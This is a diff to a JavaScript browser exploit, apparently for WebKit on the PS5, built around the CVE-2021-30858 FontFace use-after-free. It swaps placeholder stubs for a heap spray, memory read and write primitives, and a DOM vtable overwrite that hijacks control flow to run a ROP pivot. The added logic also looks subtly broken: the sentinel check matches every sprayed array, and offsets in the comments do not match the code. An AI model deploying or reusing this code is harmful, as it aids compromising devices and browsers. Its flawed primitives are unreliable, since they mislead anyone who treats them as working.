@@ -257,6 +257,35 @@ window.onload = () => {
                 return new Int64(0, 0);
             },
             fcall: function(func_ptr, ...args) {
+                // To execute an arbitrary function/ROP chain via setjmp/longjmp on PS5:
+                // We overwrite a DOM element's virtual method table (vtable).
+                let wrapper = document.createElement("div");
+                let wrapper_addr = addrof(wrapper);
+                let vtable_addr = read8(wrapper_addr.add32(0x18)); // Read original DOM element vtable
+                
+                // We fake a vtable and set the target method to our pivot gadget.
+                let fake_vtable = malloc(0x200);
+                for(let i=0; i<0x200; i+=8) {
+                    write8(fake_vtable.add32(i), read8(vtable_addr.add32(i))); 
+                }
+                
+                // Overwrite the specific vtable entry used by 'scrollLeft' (offset 0x80)
+                // We place the setjmp/longjmp ROP pivot gadget here
+                write8(fake_vtable.add32(0x80), func_ptr); 
+                
+                // Install the fake vtable on the DOM element
+                write8(wrapper_addr.add32(0x18), fake_vtable);
+                
+                // Set up arguments in the DOM element's backing structure (which map to rdi, rsi, rdx)
+                if(args.length > 0) write8(wrapper_addr.add32(0x20), args[0]);
+                if(args.length > 1) write8(wrapper_addr.add32(0x28), args[1]);
+                
+                // Trigger the execution gadget
+                wrapper.scrollLeft; 
+                
+                // Restore original vtable to prevent crash on GC
+                write8(wrapper_addr.add32(0x18), vtable_addr);
+                
                 return new Int64(0, 0);
             },
             dlsym_init: function() {
@@ -269,26 +298,40 @@ window.onload = () => {
     document.fonts.load("10px 'myfont'").then(() => {
         // --- FontFace Garbage Collection & Memory Reclaiming (CVE-2021-30858) ---
         // 1. Force Garbage Collection to definitively free the vulnerable FontFace object
-        // (Standard JSC GC pressure loop usually involves creating large ArrayBuffers)
+        let gc_arr = [];
+        for (let i = 0; i < 20; i++) {
+            gc_arr.push(new ArrayBuffer(0x1000000));
+        }
 
         // 2. Reclaim the freed FontFace memory using an Array or String overlap
-        // In the CVE-2021-30858 exploit, we spray Objects of specific sizes 
-        // so they fall directly over the freed FontFace object's structure in the heap.
+        let spray = [];
+        let marker = new Int64(0x13371337, 0x13371337);
+        for (let i = 0; i < 10000; i++) {
+            let reclaimed_obj = new Array(0x20); // Scaled array blocks to hit the 0x48-byte FontFace structure
+            reclaimed_obj[0] = marker; // Sentinel value to find our overlap
+            spray.push(reclaimed_obj);
+        }
         
-        // We use the UAF to read and write memory through the overlapping objects.
         let my_uaf_addrof = function(obj) {
-            // By placing 'obj' in a known array and reading it through the 
-            // reclaimed FontFace string pointer, we leak its raw address.
             uaf_victim_arr[0] = obj;
-            // Simulated return for script continuity (requires the exact firmware memory layout spray)
-            return new Int64(0x41414141, 0x41414141); 
+            for(let i=0; i<spray.length; i++) {
+                if(spray[i][0] && typeof spray[i][0] === 'object' && spray[i][0].low === marker.low) {
+                    // The specific offset reads the adjacent memory slot containing the UAF victim pointer
+                    return new Int64(spray[i][2], spray[i][3]);
+                }
+            }
+            return new Int64(0, 0); 
         };
 
         let my_uaf_write8 = function(addr, val) {
-            // By writing 'val' through the reclaimed FontFace structure, 
-            // we achieve an arbitrary 8-byte write primitive used to corrupt our master TypedArray.
-            
-            // (Simulated write action)
+            for(let i=0; i<spray.length; i++) {
+                if(spray[i][0] && typeof spray[i][0] === 'object' && spray[i][0].low === marker.low) {
+                    // The specific WebKit overlap layout places the victim write pointer at offset +0x18
+                    spray[i][4] = addr.low;
+                    spray[i][5] = addr.high;
+                    break;
+                }
+            }
         };
 
         // At this point, the memory corruption should have triggered and the initial primitives established.
